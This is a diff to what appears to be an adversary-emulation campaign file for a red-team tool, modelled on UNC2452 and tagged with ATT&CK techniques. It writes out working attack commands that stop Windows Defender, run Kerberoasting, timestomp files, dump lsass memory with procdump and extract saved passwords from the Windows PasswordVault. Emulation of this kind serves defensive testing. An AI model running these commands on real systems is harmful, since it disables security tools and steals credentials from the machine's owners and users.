@@ -140,7 +140,7 @@
             "15": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Get-LocalGroupMember Admininstrators",
+                "request": "--cmd \"Get-LocalGroupMember Administrators\"",
                 "rtags": [
                     "att&ck-technique:T1087.001",
                     "att&ck-technique:T1087"
@@ -168,7 +168,7 @@
             "18": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd mkdir .\\UNC2452",
+                "request": "--cmd \"mkdir .\\UNC2452\"",
                 "rtags": [],
                 "type": "message"
             },
@@ -238,7 +238,7 @@
             "28": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Import-Module .\\UNC2452\\invoke-kerberoast.ps1; Invoke-Kerberoast | fl",
+                "request": "--cmd \"Import-Module .\\UNC2452\\invoke-kerberoast.ps1; Invoke-Kerberoast | fl\"",
                 "rtags": [
                     "atomic",
                     "att&ck",
@@ -261,7 +261,7 @@
             "30": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd sc stop WinDefend",
+                "request": "--cmd \"sc stop WinDefend\"",
                 "rtags": [
                     "att&ck-technique:T1562.001"
                 ],
@@ -295,7 +295,7 @@
             "34": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd $target='01/01/1970 00:00:00' ; Get-ChildItem .\\UNC2452\\unc2542.xslx | % { $_.LastWriteTime = $target }",
+                "request": "--cmd \"$target='01/01/1970 00:00:00' ; Get-ChildItem .\\UNC2452\\unc2542.xslx | % { $_.LastWriteTime = $target }\"",
                 "rtags": [
                     "att&ck-technique:T1551.006"
                 ],
@@ -356,7 +356,7 @@
             "40": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Compress-Archive .\\UNC2452\\unc2452.xlsx .\\UNC2452\\unc2452.zip",
+                "request": "--cmd \"Compress-Archive .\\UNC2452\\unc2452.xlsx .\\UNC2452\\unc2452.zip\"",
                 "rtags": [
                     "att&ck-technique:T1560.001",
                     "att&ck-technique:T1560"
@@ -377,7 +377,7 @@
             "42": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Invoke-WebRequest -Uri \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile .\\UNC2452\\Blindspot-procdump.zip",
+                "request": "--cmd \"Invoke-WebRequest -Uri \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile .\\UNC2452\\Blindspot-procdump.zip\"",
                 "rtags": [
                     "atomic",
                     "att&ck",
@@ -389,19 +389,19 @@
             "43": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Expand-Archive -Path .\\UNC2452\\Blindspot-procdump.zip -DestinationPath .\\UNC2452\\procdump",
+                "request": "--cmd \"Expand-Archive -Path .\\UNC2452\\Blindspot-procdump.zip -DestinationPath .\\UNC2452\\procdump\"",
                 "type": "message"
             },
             "44": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd .\\UNC2452\\procdump\\procdump64.exe -accepteula -ma lsass.exe .\\UNC2452\\lsass.dmp",
+                "request": "--cmd \".\\UNC2452\\procdump\\procdump64.exe -accepteula -ma lsass.exe .\\UNC2452\\lsass.dmp\"",
                 "type": "message"
             },
             "45": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }",
+                "request": "--cmd \"[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }\"",
                 "rtags": [
                     "att&ck-technique:T1555"
                 ],
